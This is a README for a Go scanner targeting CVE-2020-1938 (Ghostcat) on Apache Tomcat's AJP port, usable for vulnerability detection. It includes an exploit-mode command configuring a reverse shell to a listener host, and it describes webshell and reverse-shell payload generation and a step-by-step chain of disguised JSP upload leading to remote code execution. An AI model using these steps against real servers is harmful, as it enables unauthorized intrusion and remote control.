# Ghostcat Scanner — CVE-2020-1938

**Apache Tomcat AJP Local File Inclusion / Remote Code Execution Detector**

Standalone Go tool for detecting CVE-2020-1938 (Ghostcat) vulnerability and providing RCE exploitation guidance.

## Features
- **Fast AJP scanning** with configurable workers
- **LFI detection** - Read arbitrary files from webapp directory
- **RCE exploitation guide** - Step-by-step instructions for webshell upload
- **Payload generation** - JSP webshell and reverse shell templates
- **Multiple output formats** - Text, JSON, CSV

## Build
```bash
go build -o ghostcat .
```

## Usage
```bash
# Basic scan
./ghostcat targets.txt

# With options
./ghostcat targets.txt -p 8009 -w 20 -t 5 -o results.txt -v

# RCE mode (generates exploitation guide)
./ghostcat targets.txt --exploit --lhost 10.0.0.1 --lport 4444 --shell-type reverse
```

## Targets File Format
One host per line (IP or hostname). Lines starting with `#` are ignored.

## How Ghostcat Works
1. Connects to AJP port (default 8009)
2. Sends crafted Forward Request with `javax.servlet.include.*` attributes
3. If vulnerable, Tomcat returns requested file content
4. Default reads `/WEB-INF/web.xml` for detection
5. Can read any file accessible to the webapp

## RCE Chain
**Requirements:**
- Vulnerable Tomcat with AJP exposed
- Application with file upload feature
- Uploaded files stored in webapp directory

**Steps:**
1. Upload JSP webshell (disguised as .txt/.jpg)
2. Include uploaded file via Ghostcat
3. Tomcat compiles and executes JSP → RCE

## Authors
Created for Huntool-scr project

## References
- [CVE-2020-1938](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)
- [Apache Tomcat Security Advisory](https://tomcat.apache.org/security-9.html)
